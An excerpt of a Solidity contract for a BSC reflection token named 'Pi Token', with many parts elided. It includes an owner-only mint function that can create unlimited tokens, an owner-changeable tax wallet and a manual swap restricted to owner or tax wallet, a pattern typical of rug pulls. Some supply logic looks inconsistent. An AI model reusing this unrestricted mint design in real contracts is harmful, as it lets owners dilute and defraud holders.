...
contract PiToken is Context, IERC20, Ownable {
    ...
    string private constant _name = "Pi Token";
    string private constant _symbol = "$PIA";
    uint8 private constant _decimals = 9;


    address payable private _Tax = payable(0xBF507E1350b589cB3a0656d6A46cf1dDe55bD7A1);
    ...
    // Router BSC Mainnet: 0x10ED43C718714eb63d5aA57B78B54704E256024E
    ...
    event TaxUpdate(address indexed previous, address indexed adr);
    function setTax(address payable tax) public onlyOwner() {
        emit TaxUpdate(_Tax, tax);	
        _isExcludedFromFee[_Tax] = false;
        _Tax = tax;
        _isExcludedFromFee[_Tax] = true;
    }
    ...
    function _getCurrentSupply() private view returns(uint256, uint256) {
        ...
        uint256 tSupply = MAX;      
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, MAX);
        return (rSupply, tSupply);
    }

    function manualswap() external {
        require(_msgSender() == _Tax || _msgSender() == owner());
    ...
    function mint(address _receiver, uint256 amount) external onlyOwner {
        ...
        // _beforeTokenTransfer(address(0), _receiver, amount);

        _tTotal = _tTotal.add(amount);
        _rTotal = (MAX - (MAX % _tTotal));
        _rOwned[_receiver] = _rOwned[_receiver].add(rTransferAmount);
        emit Transfer(address(0), _receiver, amount);

        // _afterTokenTransfer(address(0), _receiver, amount);
    }
}
